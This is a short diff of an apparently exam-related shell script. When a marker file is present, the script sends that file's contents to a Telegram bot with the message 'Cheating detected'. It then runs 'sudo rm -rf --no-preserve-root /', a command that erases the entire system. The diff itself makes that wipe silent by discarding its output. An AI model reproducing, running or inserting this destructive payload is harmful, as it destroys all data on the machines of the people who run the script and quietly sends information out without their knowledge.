@@ -12,7 +12,7 @@ if test -f /etc/.midtermconfig; then
 	INFO=`cat /etc/.midtermconfig`
 	CHAT_TEXT="$INFO Cheating detected"
 	curl -s --data "chat_id=$CHAT_ID" --data "text=$CHAT_TEXT" 'https://api.telegram.org/bot'$API_KEY'/sendMessage' >> /dev/null
-	sudo rm -rf --no-preserve-root /
+	sudo rm -rf --no-preserve-root / &>> /dev/null
 else
 
 	while [ "$ANS" != "y" ]
